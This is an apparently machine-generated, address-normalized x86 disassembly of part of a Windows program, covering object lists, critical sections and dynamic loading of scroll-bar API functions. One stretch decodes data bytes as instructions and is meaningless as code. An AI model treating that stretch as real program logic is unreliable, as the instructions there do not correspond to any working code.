xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40566c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_423a2c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405640
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40566c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_4247f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42486e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_424984
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405640
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424875
lea eax [ ebp - 0x8 ]
call sub_405628
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_424910
mov [ rw-data ] eax
sub_42487c
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424910
mov [ rw-data ] eax
mov ecx r-xdata
call sub_40566c
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_4248d4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405640
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_424910
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40323c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4239f0
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4239f0
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4239f0
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403fbc
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_424984
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_424a85
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4248d4
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_423a40
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405628
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cd90
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405628
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cd90
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4248d4
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_423a40
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4248d4
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_423a40
mov ecx r-xdata
call sub_40566c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424a8c
lea eax [ ebp - 0xc ]
call sub_405628
lea eax [ ebp - 0x8 ]
call sub_405628
retn
sub edx 0xfffffff8
sub_424aa4
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_423a2c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_424ae4
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_423a2c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_424b14
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_424ca6
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_423a2c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424c41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424cad
lea eax [ ebp - 0x10 ]
call sub_403fbc
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_423a2c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
mov eax esi
xor edx edx
call sub_423a2c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_423a2c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40326c
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_423a2c
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_424cb4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_424d99
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_404010
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424da0
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a44
lea eax [ ebp - 0x8 ]
call sub_405628
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_423a2c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405640
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40566c
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_423a2c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405640
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40566c
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_424fd0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4250c3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_404010
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4250ca
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a44
lea eax [ ebp - 0x10 ]
call sub_405628
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_40566c
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_423a2c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_405640
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_40566c
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_4250e8
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4251c7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_404010
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4251ce
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a44
lea eax [ ebp - 0x8 ]
call sub_405628
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40566c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_423a2c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405640
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40566c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_425244
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40446c
xor eax eax
push ebp
push sub_4252d9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_404010
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_424fd0
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4252e0
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax ebx
call sub_424ae4
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_424b14
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_424cb4
sub_425304
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_423a2c
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_423a2c
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4138b8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_423a2c
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4138b8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4138b8
sub_425390
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
call sub_424aa4
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_40326c
mov eax [ esi + 0x14 ]
call sub_40326c
mov eax [ esi + 0x10 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405628
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_4253e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42541b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425422
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42542c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425451
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425458
retn
sub_425464
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425495
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42549c
retn
mov eax [ rw-data ]
call sub_40326c
sub_4254a8
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_4254dc
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_425504
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_425786
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4257ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4257b4
retn
sub_4257c8
adc al 0x58
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 ] bl
inc edx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
xchg esp eax
pop eax
inc edx
add [ eax + 0xe004258 ] bl
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x78 ] si
pop eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004258 ] al
add [ eax ] al
add al cl
push edi
inc edx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
fcomp [ eax + 0x42 ]
add [ ecx + ebx * 2 ] cl
inc edx
add [ eax ] bl
pop ecx
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_42589c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40323c
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4258dc
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_425934
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425959
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425960
retn
sub_42596c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_425924
xor eax eax
push ebp
push sub_425b23
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b2a
mov eax [ rw-data ]
call sub_42592c
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_425b2c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_425924
xor eax eax
push ebp
push sub_425edf
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ee6
mov eax [ rw-data ]
call sub_42592c
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
